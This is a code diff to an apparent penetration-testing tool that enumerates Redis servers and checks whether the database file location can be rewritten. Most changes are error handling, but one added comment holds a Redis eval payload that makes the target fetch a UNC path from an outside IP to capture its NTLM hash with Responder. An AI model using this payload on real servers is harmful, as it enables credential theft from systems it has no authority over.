@@ -54,13 +54,16 @@ namespace Reecon
                         returnText += Environment.NewLine + "- " + os;
                         string osBits = redisLines.First(x => x.StartsWith("arch_bits:"));
                         returnText += Environment.NewLine + "- " + osBits;
-                        string exeLocation = redisLines.First(x => x.StartsWith("executable:"));
-                        returnText += Environment.NewLine + "- " + exeLocation;
+                        string exeLocation = redisLines.FirstOrDefault(x => x.StartsWith("executable:"));
+                        if (exeLocation != null)
+                        {
+                            returnText += Environment.NewLine + "- " + exeLocation;
+                        }
                         string configLocation = redisLines.First(x => x.StartsWith("config_file:"));
                         returnText += Environment.NewLine + "- " + configLocation;
                         string connectedClients = redisLines.First(x => x.StartsWith("connected_clients:"));
                         returnText += Environment.NewLine + "- " + connectedClients;
-
+                        System.Threading.Thread.Sleep(1000);
                         // Get dbfilenme
                         cmdBytes = Encoding.ASCII.GetBytes(("CONFIG GET dbfilename" + Environment.NewLine).ToCharArray());
                         redisSocket.Send(cmdBytes, cmdBytes.Length, 0);
@@ -75,7 +78,8 @@ namespace Reecon
                         }
                         else
                         {
-                            Console.WriteLine("Error: Cannot get dbfilename - Count is: " + redisLines.Count);
+                            returnText += Environment.NewLine + "-- Error: Cannot get dbfilename - Count is: " + redisLines.Count + " (Expecting 6)";
+                            returnText += Environment.NewLine + "--- Try manually - Connect to service, run: CONFIG GET dbfilename";
                         }
 
                         // Can we set dbfilename
@@ -145,11 +149,12 @@ namespace Reecon
                             returnText += Environment.NewLine + "--- " + "6.) Browse to file location on server to see your custom value".Pastel(Color.Orange);
                         }
                     }
+                    // eval "dofile('//10.8.26.200/test')" 0 - Get Responder hash
 
                 }
                 catch (Exception ex)
                 {
-                    returnText += Environment.NewLine + "- Error - Cannot pull Redis Text: " + ex.Message;
+                    returnText += "- Error - Cannot pull Redis Text: " + ex.Message;
                 }
             }
             return returnText;
